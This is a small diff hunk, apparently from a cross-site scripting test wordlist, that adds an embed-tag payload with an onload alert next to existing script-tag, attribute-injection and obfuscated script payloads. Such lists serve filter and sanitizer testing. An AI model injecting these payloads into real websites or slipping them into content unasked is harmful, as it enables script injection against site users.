@@ -2167,3 +2167,4 @@ http://www.<script>alert(1)</script .com
 " onmouseover="alert(4321)" blah="
 /><input>
 <script>({' \ '(){alert(1)}})[` \ `]()</script>
+<embed src=URL onload=alert('xss')>
